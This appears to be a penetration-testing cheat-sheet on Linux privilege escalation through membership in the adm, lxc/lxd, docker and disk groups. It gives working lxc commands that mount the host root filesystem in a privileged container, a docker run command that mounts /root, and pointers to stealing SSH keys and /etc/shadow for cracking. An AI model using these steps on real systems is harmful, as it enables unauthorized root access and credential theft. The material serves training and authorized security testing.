# Privileged Groups

## **ADM Group**

> Members of the `adm` group are able to read all logs stored in `/var/log`.
>
> This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

***

## **LXC and LXD groups (Linux Containers) Privilege Escalation**

> **Prerequisites:** the current used needs to be a **member of** the `lxc` or `lxd` **groups**
>
> **Description:** it is possible to grant ourselves root privileges by editing the container template (often forgot on the target machine)

**Attack Path:**

1. Suppose we found a folder named `ContainerImages` where the container image is stored (without any password protection)
2. Import the container as an image: `lxc image import container-template-name.tar.xz --alias temp`
3. Ensure the container was imported: `lxc image list`
4. Start a privileged container named `r00t`: `lxc init temp r00t -c security.privileged=true`
   * This will start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
5. Mount the host file system: `lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true`
6. Start the container: `lxc start r00t`
7. The host filesystem will be mounted inside the container at the previously specified path (e.g. `/mnt/root`)

***

## **Docker Group**

> Placing a user in the docker group is essentially **equivalent to root level access to the file system without requiring a password**.
>
> Members of the docker group can spawn new docker containers.

**Example:**

* One example would be running the command `docker run -v /root:/mnt -it ubuntu`
* This command creates a new Docker instance with the `/root` directory on the host file system mounted as a volume.
* This way, it is possible to browse to the mounted directory(holding the entire filesystem) and retrieve or add SSH keys for the root user or retrieve the contents of the `/etc/shadow` file for offline password cracking or adding a privileged user.

***

## **Disk Group**

> Users within the disk group have full access to any devices contained within `/dev`
>
> Such as `/dev/sda1`, which is typically the main device used by the operating system.
>
> An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges.
>
> This could be leveraged to retrieve SSH keys, credentials or to add a new user.
